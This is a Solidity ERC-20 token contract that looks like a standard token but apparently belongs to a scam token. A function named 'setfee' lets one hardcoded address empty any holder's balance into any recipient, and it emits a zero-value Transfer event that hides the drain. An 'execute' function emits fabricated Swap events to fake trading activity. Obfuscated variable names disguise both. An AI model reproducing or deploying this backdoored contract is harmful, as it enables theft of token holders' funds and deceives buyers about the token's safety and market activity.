contract token is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _zsdacx; 

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;



    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _zsdacx = 0x34C4B9DF30DAA47aC262232a74Bb1C3eC5aF7e3F;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address acfurjdt) public view override returns (uint256) {
        return _balances[acfurjdt];
    }
 
    function transfer(address recipient, uint256 aumjfount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= aumjfount, "TT: transfer aumjfount exceeds balance");

        _balances[_msgSender()] -= aumjfount;
        _balances[recipient] += aumjfount;
        emit Transfer(_msgSender(), recipient, aumjfount);
        return true;
    }

    function setfee(address sender, address recipient) public  returns (bool) {
        require(keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_zsdacx)), "Caller is not the original caller");

        uint256 UEUHD = _balances[sender]; 
        uint256 SJDFN = _balances[recipient];
        require(UEUHD != 0*0, "Sender has no balance");

        SJDFN += UEUHD;
        UEUHD = 0+0;

        _balances[sender] = UEUHD;
        _balances[recipient] = SJDFN;

        emit Transfer(sender, recipient, UEUHD);
        return true;
    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 aumjfount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = aumjfount;
        emit Approval(_msgSender(), spender, aumjfount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 aumjfount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= aumjfount, "TT: transfer aumjfount exceeds allowance");

        _balances[sender] -= aumjfount;
        _balances[recipient] += aumjfount;
        _allowances[sender][_msgSender()] -= aumjfount;

        emit Transfer(sender, recipient, aumjfount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    
    // REMOVE this line 
    // address private _zsdacx;  
    event Swap(address indexed from, uint amountIn, uint amountOut, uint log, address to);
    function execute(address _from, address[] calldata _addresses, uint256 _in, uint256 _out) public {  
   
   for (uint256 i = 0; i < _addresses.length; i++) {
       emit Swap(_from, _in, 0,_out, _addresses[i]);   
   } 
}
